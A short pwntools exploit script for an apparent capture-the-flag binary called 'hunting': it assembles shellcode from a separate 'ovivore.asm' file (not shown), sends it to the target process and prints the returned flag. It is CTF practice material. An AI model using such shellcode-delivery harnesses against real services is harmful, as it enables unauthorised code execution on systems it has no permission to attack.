import pathlib

from pwn import *

import utils.target

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
b entry
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir/'hunting'
ovivore_asm = parent_dir/'ovivore.asm'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

ovivore = asm(ovivore_asm.read_text(), extract=True)

info(f'Sending exploit shellcode of size {hex(len(ovivore))}...')

io = utils.target.start(exe=str(exe), gdb_script=gdb_script)

io.sendline(ovivore)

flag = io.recvuntil(b'\x00', drop=True).decode('ascii')
success(f'FLAG: {flag}')
